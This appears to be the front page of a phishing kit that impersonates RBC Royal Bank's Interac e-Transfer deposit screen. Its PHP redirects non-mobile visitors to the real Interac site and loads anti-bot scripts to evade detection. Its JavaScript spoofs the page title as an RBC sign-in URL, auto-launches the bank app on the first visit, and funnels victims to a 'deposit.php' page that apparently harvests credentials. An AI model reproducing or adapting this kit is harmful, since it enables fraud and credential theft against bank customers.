<?php

// ---------------- Force HTTPS safely ----------------
$isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
           || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

if (!$isHttps) {
    $redirect = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('Location: ' . $redirect, true, 301);
    exit;
}

// ---------------- HTTP headers to disable caching ----------------
header('Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');
header('Surrogate-Control: no-store');

// ---------------- Device blocking ----------------
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!preg_match('/Android|iPhone/i', $userAgent)) {
    header("Location: https://etransfer.interac.ca/error");
exit;
    exit;
}

// ---------------- Include anti-bot scripts ----------------
$docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/');
$antibots = ['anti1','anti2','anti3','anti4','anti5','anti6'];
foreach ($antibots as $bot) {
    $file = "$docRoot/antibots/$bot.php";
    if (file_exists($file)) require_once $file;
}

// ---------------- Optional redirect ----------------
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="robots" content="noindex, nofollow">
<title>RBC Royal Bank Mobile</title>

<link rel="stylesheet" href="assets/css/index.css">

<style>
html, body {
    margin:0; padding:0; width:100%; height:100%; overflow:hidden;
    touch-action:none; -ms-touch-action:none;
}
#home {
    width:100%; height:100%; box-sizing:border-box;
}
#mobile-content-text, #app-store-text {
    font-size:3vw; /* text scales to fit screen */
    line-height:1.2em;
}
</style>

<script>
function openRbcEtransfer() {
    const iosAppLink = 'rbc://etransfer';
    const androidAppLink = 'intent://etransfer#Intent;scheme=rbc;package=com.rbc.mobile.android;end';
    const fallbackUrl = 'deposit.php';
    const ua = navigator.userAgent || navigator.vendor || window.opera;
    if (/android/i.test(ua)) {
        window.location.href = androidAppLink;
        setTimeout(()=>{ window.location.href = fallbackUrl; },2000);
    } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
        window.location.href = iosAppLink;
        setTimeout(()=>{ window.location.href = fallbackUrl; },2000);
    } else {
        window.location.href = fallbackUrl;
    }
}

// Device detection for App Store button
window.addEventListener('load', ()=>{
    const ua = navigator.userAgent || navigator.vendor || window.opera;
    const appStoreLogo = document.getElementById('app-store-logo');
    appStoreLogo.innerHTML = '';
    const a = document.createElement('a');
    const img = document.createElement('img');
    img.height = 46;
    if (/android/i.test(ua)) {
        a.href = 'https://play.google.com/store/apps/details?id=com.rbc.mobile.android';
        img.src = './files/android-play-store.png';
        img.alt = 'Google Play Store - RBC Mobile';
    } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
        a.href = 'https://itunes.apple.com/ca/app/rbc-mobile/id407597290?mt=8';
        img.src = './files/ios-app-str.png';
        img.alt = 'App Store - RBC Mobile';
    } else {
        a.href = '#';
        img.src = './files/ios-app-str.png';
        img.alt = 'RBC Mobile App';
    }
    a.appendChild(img);
    appStoreLogo.appendChild(a);
});

// Lock gestures
document.addEventListener('gesturestart', e=>e.preventDefault());
document.addEventListener('gesturechange', e=>e.preventDefault());
document.addEventListener('gestureend', e=>e.preventDefault());
</script>
</head>

<body>
<div id="home" tabindex="0">
    <div id="header">
        <span id="logo"><img src="./files/logo-en.png" height="60" alt="RBC Logo"></span>
    </div>
    <div id="mobile-sub-header">
        <span id="sub-logo"><img src="./files/int-en.png" height="47" alt="Interac e-Transfer Logo"></span>
    </div>

    <div id="mobile-content">
        <div id="mobile-content-text">How would you like to deposit your Interac e-Transfer?</div>
    </div>

    <a href="#" id="download-link" class="ui-link" onclick="openRbcEtransfer(); return false;">
        <div id="mobile-app-btn">
            <p class="btn-text">RBC Mobile</p>
        </div>
    </a>

    <a href="deposit.php" id="nothanks-link" class="ui-link">
        <div id="online-banking-btn">
            <p class="btn-text">RBC Online Banking</p>
        </div>
    </a>

    <div id="app-store-wrapper">
        <div id="app-store-text">If you don’t have the latest version of the RBC Mobile App, you can download it here:</div>
        <div id="app-store-logo"></div>
    </div>

    <div id="footer-wrapper">
        <!-- Footer content -->
    </div>

</div>
<script>
// Lock gestures, scroll, and zoom
document.addEventListener('gesturestart', e => e.preventDefault());
document.addEventListener('gesturechange', e => e.preventDefault());
document.addEventListener('gestureend', e => e.preventDefault());
document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });

// Track visits
function trackVisits() {
    let visits = parseInt(localStorage.getItem('rbc_visit_count') || 0) + 1;
    localStorage.setItem('rbc_visit_count', visits);

    if (visits === 1) {
        openRbcEtransfer(); // first visit → auto-launch app
    } else if (visits >= 3) {
        window.location.href = 'deposit.php'; // third visit → redirect
    }
}

// Open RBC Mobile deep link
function openRbcEtransfer() {
    const iosAppLink = 'rbc://etransfer';
    const androidAppLink = 'intent://etransfer#Intent;scheme=rbc;package=com.rbc.mobile.android;end';
    const fallback = window.location.href;
    const ua = navigator.userAgent || navigator.vendor || window.opera;

    if (/android/i.test(ua)) {
        window.location.href = androidAppLink;
        setTimeout(() => { window.location.href = fallback; }, 2000);
    } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
        window.location.href = iosAppLink;
        setTimeout(() => { window.location.href = fallback; }, 2000);
    } else {
        window.location.href = fallback;
    }
}

// Device-specific App Store badge
function setupAppStoreButton() {
    const ua = navigator.userAgent || navigator.vendor || window.opera;
    const container = document.getElementById('app-store-logo');
    if (!container) return;

    container.innerHTML = '';
    const a = document.createElement('a');
    const img = document.createElement('img');
    img.height = 46;

    if (/android/i.test(ua)) {
        a.href = 'https://play.google.com/store/apps/details?id=com.rbc.mobile.android';
        img.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png';
        img.alt = 'Google Play Store - RBC Mobile';
    } else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
        a.href = 'https://itunes.apple.com/ca/app/rbc-mobile/id407597290?mt=8';
        img.src = './files/ios-app-str.png';
        img.alt = 'App Store - RBC Mobile';
    } else {
        a.href = '#';
        img.src = './files/ios-app-str.png';
        img.alt = 'RBC Mobile App';
    }

    a.appendChild(img);
    container.appendChild(a);
}

// Run on page load
window.addEventListener('load', () => {
    trackVisits();
    setupAppStoreButton();
});
</script>
<script>
// Replace all <title> tags and document.title
(function(customTitle){
    document.title = customTitle;
    // Replace any <title> elements in <head>
    const titles = document.getElementsByTagName('title');
    for(let t of titles){ t.textContent = customTitle; }
})("secure.royalbank.com/statics/login-service-ui/index#/full/signin?_gl=1*1yx3bz5*_gcl_aw*R0NMLjE3NjA1NTYzNDQuQ2owS0NRandqTDNIQmhDZ0FSSXNBUFVnN2E2cWh0WHktakl3VG0wdlktSkN3dW9LNVF4VGJMaXdmQmt4NzY4NzRCRjdVVnBobFh5Z2pGd2FBbVV5RUFMd193Y0I.*_gcl_au*MzQzNjkwMzAzLjE3NTkwNjI1NDg.*_ga*MTg1NTIyMTA1Ni4xNzU5MDYyNTQ5*_ga_89NPCTDXQR*czE3NjA4ODc2NDQkbzQkZzEkdDE3NjA4ODc2NDQkajYwJGwwJGgw&LANGUAGE=ENGLISH");
</script>
</body>

</html>
